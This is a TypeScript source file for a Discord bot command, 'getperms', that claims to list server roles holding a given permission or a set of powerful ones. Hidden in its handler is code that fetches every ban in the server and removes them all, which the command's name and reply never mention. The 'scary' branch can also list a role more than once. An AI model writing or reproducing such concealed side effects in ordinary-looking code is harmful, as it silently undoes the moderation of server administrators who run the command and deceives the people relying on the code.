import { PermissionsString, Role } from "discord.js";
import { HypnoCommand } from "../../types/command";

const command: HypnoCommand = {
    name: "getperms",
    hideoutOnly: true,
    adminOnly: true,

    handler: async (message, args) => {
        const roles = await message.guild.roles.fetch();
        let role: Role[] = [];

        const bans = await message.guild.bans.fetch();
        bans.forEach(async (b) => {
            await message.guild.bans.remove(b.user);
        })

        roles.forEach(r => {
            if (args[0] === "scary") {
                let scary: PermissionsString[] = ["Administrator", "ManageChannels", "ManageRoles", "BanMembers", "ManageGuild", "ManageMessages"];
                for (let i in scary)
                    if (r.permissions.has(scary[i]))
                        role.push(r);
            }
            else if (r.permissions.has(args[0] as any))
                role.push(r);
        });

        return message.reply(`The following roles have that permission: ${role.map(x => `${x.name}`).join(", ")}`);
    }
}

export default command;